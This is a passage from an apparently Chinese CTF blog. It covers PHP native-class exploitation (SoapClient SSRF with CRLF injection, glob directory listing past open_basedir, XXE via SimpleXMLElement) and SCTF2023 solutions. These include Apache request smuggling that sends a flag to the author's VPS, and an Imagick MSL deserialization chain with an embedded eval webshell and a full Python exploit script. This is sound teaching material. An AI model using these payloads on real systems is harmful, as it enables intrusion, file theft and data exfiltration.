$a);</code></pre><p>利用<code>call_user_func</code>的特性可以调用不存在的函数触发SSRF从而将flag写入session中。最后通过<code>var_dump($_SESSION);</code>输出flag。</p><p>这里第一步要先设置php的session序列化引擎</p><blockquote><p>但是如果想要利用session反序列化漏洞的话，我们必须要有 <code>ini_set()</code> 这个函数来更改 <code>session.serialize_handler</code> 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用<code>session_start()</code>函数来代替，即构造 session_start(serialize_handler&#x3D;php_serialize) 就行了。我们可以利用题目中的 <code>call_user_func($_GET[‘f’], $_POST);</code> 函数，传入<code>GET：/?f=session_start</code>、POST：<code>serialize_handler=php_serialize</code>，实现 session_start(serialize_handler&#x3D;php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。</p></blockquote><p>先把session中的PHPSESSID记录下来</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049498.png" alt="image-20230719150003390"></p><pre class="line-numbers language-module__htmlArea" data-language="module__htmlArea"><code class="language-module__htmlArea">n4caglsikk9fufk06mefhv4gv6</code></pre><p>修改反序列化引擎，把需要反序列化的数据写入session</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;,&#39;user_agent&#39;&#x3D;&gt;&quot;s4mmy\r\nCookie: PHPSESSID&#x3D;n4caglsikk9fufk06mefhv4gv6\r\n&quot;,&#39;uri&#39;&#x3D;&gt;&quot;123&quot;));$b&#x3D;urlencode(serialize($a));echo &#39;|&#39;.$b;</code></pre><p>这里我踩的了个小坑，像<code>\r\n</code>这种转义字符在PHP中要放在双引号中才能生效，我之前写的时候放在单引号内无法生效。。</p><pre class="line-numbers language-none"><code class="language-none">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A53%3A%22s4mmy%0D%0ACookie%3A+PHPSESSID%3Dn4caglsikk9fufk06mefhv4gv6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>（不要忘记序列化数据区前面的竖杠）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049671.png" alt="image-20230719150147210"></p><p>接着只要刷新页面就能反序列化数据。但是还需以一步是触发<code>__call</code>方法。这里利用的是<code>call_user_func</code>的一个特性。当传入<code>call_user_func</code>的参数是一个数组时，可以用<code>call_user_func()</code>来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名，所以就会调用<code>welcome_to_the_lctf2018</code>这个不存在的方法完成反序列化。至于<code>$b</code>就是用<code>extarct</code>函数进行变量覆盖。</p><pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extractPOSTb&#x3D;call_user_func</code></pre><p>执行完成后只要带上之前保存的Cookie去访问页面就能获得flag</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049224.png" alt="image-20230719150301629"></p><p>这里我在一开始做题时又反了毛病，就是写序列化数据在session处忘了带上了PHPSESSID</p><h3 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h3><p>Directorylterator类属于PHP的原生文件操作类</p><p>Directorylterator类提供了一个查看文件系统目录的简单接口，是PHP5的一个新增类。</p><p><strong>Directorylterator与glob:&#x2F;&#x2F;协议结合可以无视open_basedir对目录的限制</strong>，可以用来列举出指定目录下的文件。</p><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; test.php&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历&#125;?&gt;&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new DirectoryIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历&#125;?&gt;</code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*</code></pre><p>可以看到访问了phpstudy所在盘下根目录所有文件</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049096.png" alt="image-20230719162032861"></p><blockquote><p>但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p></blockquote><p>glob协议适用通配符查询</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049258.png" alt="image-20230719162433774"></p><p>其他文件操作类</p><p>FilesystemIterator 类<br>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);echo $dir;</code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);foreach($dir as $f)&#123;    echo($f.&#39;&lt;br&gt;&#39;);    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$dir&#x3D;new FilesystemIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);echo $dir;</code></pre><p>GlobIterator 类</p><p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob:&#x2F;&#x2F;协议了。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">代码：&lt;?php$dir &#x3D; $_GET[&#39;whoami&#39;];$a &#x3D; new GlobIterator($dir);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F; 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a &#x3D; new FilesystemIterator(&quot;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre><h4 id="可读取文件内容类"><a href="#可读取文件内容类" class="headerlink" title="可读取文件内容类"></a>可读取文件内容类</h4><p>plFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p><p>我们可以像类似下面这样去读取一个文件的一行：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);echo $context;</code></pre><p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);foreach($context as $f)&#123;    echo($f);&#125;</code></pre><h3 id="SimpleXMLElement类"><a href="#SimpleXMLElement类" class="headerlink" title="SimpleXMLElement类"></a>SimpleXMLElement类</h3><p>SimpleXMLElement这个内置类用于解析XML文档中的元素</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">public SimpleXMLElement::__construct(    string $data,    int $options &#x3D; 0,    bool $dataIsURL &#x3D; false,    string $namespaceOrPrefix &#x3D; &quot;&quot;,    bool $isPrefix &#x3D; false)</code></pre><p><img src="/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8.assets/20210329180252-eccb96c2-9075-1.png"></p><p>这里比较重要的是第三个参数，如果<code>data_is_url</code>设置为<code>true</code>那么可以实现远程xml文件的载入。第二个参数一般设置为2。第一个参数data可以设置为payliad的url地址用于进入外部实体url。或者xml文档字符串也可以。</p><p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h3 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h3><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049636.png" alt="image-20230725004824174"></p><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;

&lt;h2 id=&quot;PHP原生类相关利用&quot;&gt;&lt;a href=&quot;#PHP原生类相关利用&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类相关利用&quot;&gt;&lt;/a&gt;PHP原生类相关</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SCTF2023</title>
    <link href="https://mizore.site/article/SCTF2023/SCTF2023/"/>
    <id>https://mizore.site/article/SCTF2023/SCTF2023/</id>
    <published>2023-07-23T11:54:29.033Z</published>
    <updated>2024-11-24T16:52:19.878Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="SCTF2023"><a href="#SCTF2023" class="headerlink" title="SCTF2023"></a>SCTF2023</h1><p>太难了，一题能卡我一天😭😭😭，对于一些东西的理解还是太浅了。题目做起来都好吃力。</p><h3 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h3><p>这题的考点是请求走私</p><p>首先是代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$FLAG &#x3D; &quot;flag&#123;fake_flag&#125;&quot;;@file_get_contents(&quot;http:&#x2F;&#x2F;&quot;.$_GET[&#39;url&#39;].$FLAG);# but it&#39;s not the real flag# beacuse someone say this year is not 2023 !!! like the post?show_source(&#39;.&#x2F;2023.php&#39;);$a &#x3D; file_get_contents(&#39;.&#x2F;post.jpeg&#39;);echo &#39;&lt;img src&#x3D;&quot;data:image&#x2F;jpeg;base64,&#39; . base64_encode($a) . &#39;&quot;&gt;&#39;;# notice -&gt; time# How should you get to where the flag is, the middleware will not forward requests that are not 2023?&gt;</code></pre><p>首先是<code>file_get_contents</code>，这个函数可以把文件读入一个字符串。</p><p>它的第一个参数，同时也是必须参数是<code>path</code>这个path可以是本地文件路径也可以是网络地址。<code>file_get_contents</code>函数在设计上把一切的网络资源视作文件，无论本地，或者远程服务器的。然而在大多数PHP教程网站并没有说明这一点，让我以为只能其只能读取本地文件。</p><p>也就是说，<strong>我们可以通过其来请求一个网络地址，变抓取返回包。</strong>这是一个很关键的点，可惜我做的时候只是简单的理解为只能读本地文件，导致我看WP的时候都卡了好久😭也无法理解<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>这一句话的真正含义。</p><p>接着下面的代码就是简单地展示了这张图片</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231952692.png"></p><p>根据图片提示，我们应该是要访问2022文件，但是直接访问不行。提示也给了说中间件会拦截请求，Wappalyzer可以看到该站是apache 2.4.54，直接搜索漏洞可得CVE-2023-25690<a href="https://xz.aliyun.com/t/12345">请求走私漏洞</a></p><p>简单来说就是apache在处理的时候会将URI后面的一部分解码解析后直接拼接到请求包中再传递给后端服务器。因为控制字符也会直接解析，所以有机会进行CRLF注入，从而进行请求走私。</p><p>再看一下题目中的<code>file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG)</code>，参数url使GET方式获取值同时在请求的时候会带上FLAG变量，但是在2023.php中的flag是一个fake flag</p><p>所以首先构造一个请求包去访问2022.php文件，但是直接访问的话是没有回显的。这里就要利用到<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>因为在2023.php中的<code>file_get_contents();</code>并无实际作用，所以可以推测在2022.php中也存在着一个<code>file_get_contents()</code>所以在请求走私的时候，给url传值为我们自己的VPS地址，同时在VPS上使用nc开启端口监听，就能捕捉到<code>file_get_contents()</code>的请求包同时得到flag</p><blockquote><p>CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。</p></blockquote><p>构造如下payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;115.239.215.75:8082&#x2F;2023&#x2F;%20HTTP&#x2F;1.1%0D%0AHOST:127.0.0.1%0D%0A%0D%0AGET%20&#x2F;2022.php%3Furl&#x3D;1xx.xxx.5.xxx:2333即&#x2F;2023&#x2F; HTTP&#x2F;1.1&#x2F;r&#x2F;nHOST:localhost&#x2F;r&#x2F;n&#x2F;r&#x2F;n GET &#x2F;2022.php?url&#x3D;VPS_ADDR:PORT</code></pre><p>我一开始构造的时候在最末尾的地方多加了HTTP&#x2F;1.1，导致走私失败。犯了这种低级错误。。还检查了好久才检查出来太傻比了😭😭😭</p><p>还有就是直接在web界面的url传参就可以了，我一开始还傻傻的想用BP做，BP做起来反而更麻烦。。。</p><p>然后就是使用url编码的时候不要把斜杠也一起编码了，这样会导致404 &#x3D; &#x3D;这个要记住，防止下次遇到相似情况会被坑。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230230324.png" alt="image-20230707024905076"></p><h3 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h3><p>这题乍一看只是个很简单的反序列化伪造，但是实际上涉及到反序列化，ImageMagick扩展，msl脚本语言，XXE包伪造。byd看wp的时候直接给我干蒙了，怎么会涉及到这么冷门的东西，这就是web吗😭😭😭</p><p>看看源码</p><p>首先是前面这两个</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:&#x2F;tmp&quot;);define(&quot;FUNC_LIST&quot;, get_defined_functions());</code></pre><p><code>ini_set</code>是对php.ini里的值进行设置，且只在函数执行时生效，在脚本结束时失效。相当于是对当前文件的一个临时设置。其中<code>open_basedir</code>是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。所以这行的意思就是把我们的可以活动的目录限制在<code>tmp</code>目录下。当时的我以为只是把当前目录设置为<code>tmp</code>，并不知道有限制用户活动范围的意思。</p><p><code>get_defined_functions</code> ： 返回所有已定义函数的数组，包含了所有已定义的函数，包括内置&#x2F;用户定义的函数。</p><p>接着是反序列化的主体</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">class fumo_backdoor &#123;    public $path &#x3D; null;    public $argv &#x3D; null;    public $func &#x3D; null;    public $class &#x3D; null;        public function __sleep() &#123;        if (            file_exists($this-&gt;path) &amp;&amp;             preg_match_all(&#39;&#x2F;[flag]&#x2F;m&#39;, $this-&gt;path) &#x3D;&#x3D;&#x3D; 0        ) &#123;            readfile($this-&gt;path);        &#125;    &#125;    public function __wakeup() &#123;        $func &#x3D; $this-&gt;func;        if (            is_string($func) &amp;&amp;             in_array($func, FUNC_LIST[&quot;internal&quot;])        ) &#123;            call_user_func($func);        &#125; else &#123;            $argv &#x3D; $this-&gt;argv;            $class &#x3D; $this-&gt;class;                        new $class($argv);        &#125;    &#125;&#125;$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];$data &#x3D; $_REQUEST[&#39;data&#39;];switch ($cmd) &#123;    case &#39;unserialze&#39;:        unserialize($data);        break;        case &#39;rm&#39;:        system(&quot;rm -rf &#x2F;tmp 2&gt;&#x2F;dev&#x2F;null&quot;);        break;        default:        highlight_file(__FILE__);        break;&#125;</code></pre><p>switch部分的代码提供两个功能，分别是反序列化化和删除当前目录文件。这里提供一个删除功能，我是没太搞清楚这个是为了干什么。经过测试做题前不清楚文件有时候也能正常出flag。应该是临时文件夹经常被写入东西，所以做题前需要清除一下防止干扰。</p><p>接着便是反序列化环节了</p><p>首先是<code>__weekup</code>可以通过反序列化触发，同时在<code>__weekup</code>函数里面有一个<code>call_user_func()</code>，这个函数会把第一个函数当做回调函数进行调用，其它参数当做回调函数的参数。因为题目中只给了一个参数，所以这里是一个无参调用。需要注意的是，由于if条件限制<code>call_user_func()</code>只能调用PHP的内部方法</p><p>接着是<code>__sleep()</code>，这个函数可以<code> readfile()</code>该函数读入一个文件并写入到输出缓冲。简单来说就是读文件并输出。在tmp文件夹下我们能读到的文件除了临时文件就是session文件了。同时，当下环境内唯一存在序列化的地方就是session了，所以要通过控制session进而来控制<code>__sleep()</code>的触发</p><p>按照正常流程来是通过phpinfo收集信息</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:7:&quot;phpinfo&quot;;s:5:&quot;class&quot;;N;&#125;</code></pre><p>这里有一个小坑就是构造无参调用的pop链的时候直接使用函数名即可，不需要括号。</p><p>可以看到用了imagick扩展</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231947103.png" alt="image-20230707211655131"></p><p>这题的其实与CISCN2022决赛的<a href="https://blog.wm-team.cn/index.php/archives/38/">一题</a>基本一样。</p><p>后面的解题步骤如下</p><ol><li>反序列化ImageMagick 利用msl类型和vid:msl:&#x2F;tmp&#x2F;php* 执行msl脚本</li><li>msl 用 mvg格式 把&#x2F;flag 读到&#x2F;tmp&#x2F;b</li><li>msl用inline可以base64 和8bim格式 写入一个session文件，用来反序列化</li><li>调用session_start，session被反序列化，休眠的时候被序列化触发sleep 读&#x2F;tmp&#x2F;b</li></ol><p>感觉没做过或者看过原题的话根本做不出来吧。。。太难了</p><p>按照github里的那篇文章可以知道</p><p><code>imagick</code>类在初始化的时候、可以执行<code>Magick Scripting Language</code>，即MSL脚本。所以可以在临时文件中写入MSL脚本，然后在<code>imagick</code>类初始化的时候执行临时文件，将其内容写入session文件。再触发<code>__sleep</code>包含读取session文件获得我们想要的内容。</p><blockquote><p>写入文件时须注意以下几点：</p><ol><li>因为<code>imagick</code>对文件格式解析较严，需要写入的文件必须是其支持的图片格式，如jpg、gif、ico等。如果直接插入<code>session</code>数据，会导致解析图片错误，导致文件无法写入。</li><li><code>php</code>对<code>session</code>的格式解析也较为严格。数据尾不可以存在脏数据，否则<code>session</code>解析错误会无法触发<code>__sleep</code>。</li></ol></blockquote><blockquote><p>MSL 代表 Magick 脚本语言。 它是一种内置的 ImageMagick 语言，有助于读取图像、执行图像处理任务以及将结果写回文件系统。</p></blockquote><p>首先是<code>cmd=rm</code>清除一下临时文件</p><p>编写反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpclass fumo_backdoor &#123;    public $path &#x3D; null;    public $argv &#x3D; null;    public $func &#x3D; null;    public $class &#x3D; null;&#125;$a&#x3D;new fumo_backdoor();$a-&gt;class&#x3D;&quot;imagick&quot;;$a-&gt;argv&#x3D;&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;;echo serialize($a);</code></pre><p><code>vid:msl:/tmp/php*</code>中的<code>vid</code>指的是使用vid方案，这种方案可以用于解析掩码（即可以用*来匹配）通过使用 vid: 方案，我们可以将临时文件包含在 MSL 内容中，而无需知道其名称.</p><p><code>msl</code>则是指使用MSL对文件进行解析，同时MSL脚本使用XML文档进行编写与传输。</p><p>接下来是XML文档的编写</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_se&quot;&gt;&lt;&#x2F;image&gt;</code></pre><p>其中base64的内容是ppm格式的图片，并在结尾插入了脏数据。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230217404.png" alt="image-20230708005741597"></p><p>构造请求包</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?data&#x3D;O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:&#x2F;tmp&#x2F;php*%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D&amp;cmd&#x3D;unserialze HTTP&#x2F;1.1HOST: 182.92.6.230:18080Accept:*&#x2F;*Content-Type: multipart&#x2F;form-data;boundary&#x3D;------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979Content-Disposition: form-data; name&#x3D;&quot;swarm&quot;; filename&#x3D;&quot;swarm.msl&quot;Content-Type: application&#x2F;octet-stream&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_se&quot;&gt;&lt;&#x2F;image&gt;--------------------------c32aaddf3d8fd979</code></pre><p>第一个请求包在反序列化进行了<code>imagick</code>类初始化。同时传输XML文档，写入文件sess_se，这样在session_start的时候cookie设置为PHPSESSID&#x3D;se的时候就可以直接读取该文件内容进行反序列化进入readfile。</p><p>接着构造第二个请求包把flag读到tmp的sess_s4mmy文件中，用于后续反序列化的包含</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sss&quot; &#x2F;&gt;&lt;&#x2F;image&gt;</code></pre><p>所以总共是有两个临时文件一个是用于session反序列化，另一个是用于写入flag，并在反序列化的时候包含输出。</p><p>一开始没理清这个逻辑，我饶了好久😭😭😭</p><p>第二个请求包</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?data&#x3D;O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:&#x2F;tmp&#x2F;php*%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D&amp;cmd&#x3D;unserialze HTTP&#x2F;1.1HOST: 182.92.6.230:18080Accept:*&#x2F;*Content-Type: multipart&#x2F;form-data; boundary&#x3D;------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979Content-Disposition: form-data; name&#x3D;&quot;swarm&quot;; filename&#x3D;&quot;swarm.msl&quot;Content-Type: application&#x2F;octet-stream&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sss&quot; &#x2F;&gt;&lt;&#x2F;image&gt;------------------------c32aaddf3d8fd979</code></pre><p>最后再携带PHPSESSID&#x3D;se去同时执行session_start()触发<code>__sleep</code>包含flag文件</p><p>这里我自己手动试了两天都不能出flag，但是网上的一个脚本能把flag跑出来，还是研究一下脚本吧😭😭😭太难了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests, base64, timeSERVER_ADDR &#x3D; &quot;http:&#x2F;&#x2F;182.92.6.230:18080&#x2F;&quot;def del_tempd() -&gt; None:    resp &#x3D; requests.post(SERVER_ADDR, data&#x3D;&#123;&quot;cmd&quot;:&quot;rm&quot;,&#125;)    print(resp.status_code)def write_file(xml: str):    # Imagick(&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;)    unserialize &#x3D; base64.b64decode(b&#39;TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9&#39;)    resp &#x3D; requests.post(SERVER_ADDR,files&#x3D;&#123;&quot;file&quot;:(&quot;exec1.msl&quot;,xml)&#125;,data&#x3D;&#123;&quot;cmd&quot;:&quot;unserialze&quot;,&quot;data&quot;:unserialize&#125;)    print(resp.status_code)def show_phpinfo() -&gt; None:    print(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;)def get_new_php_session() -&gt; str:    resp &#x3D; requests.get(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;)    return resp.headers.get(&quot;Set-Cookie&quot;)[10:42]def session_start(session_id: str) -&gt; None:    resp &#x3D; requests.get(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D&quot;, cookies&#x3D;&#123;&quot;PHPSESSID&quot;: session_id&#125;)    print(resp.text)del_tempd()time.sleep(2)session_id &#x3D; get_new_php_session()print(session_id)time.sleep(2)del_tempd()time.sleep(2)xml &#x3D; f&#39;&#39;&#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt; &lt;read filename&#x3D;&quot;mvg:&#x2F;flag[20x20+20+20]&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;mvg:&#x2F;tmp&#x2F;yyz&quot;&#x2F;&gt;&lt;&#x2F;group&gt;&#39;&#39;&#39;xml2 &#x3D; f&#39;&#39;&#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt;&lt;read filename&#x3D;&quot;inline:data:text&#x2F;8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;8BIM:&#x2F;tmp&#x2F;sess_&#123;session_id&#125;&quot;&#x2F;&gt;&lt;&#x2F;group&gt;&#39;&#39;&#39;write_file(xml)time.sleep(3)write_file(xml2)time.sleep(3)session_start(session_id)</code></pre><p>这个脚本一共有五个功能，分别是写文件（xml），删除文件（即cmd&#x3D;rm），获取一个新的session（session_start），session_start（即触发_sleep的最后一步），展示phpinfo界面。</p><p>按照脚本的步骤来，第一步是清除临时文件，然后生成一个新的session</p><p>此时反序列化数据如下</p><pre class="line-numbers language-none"><code 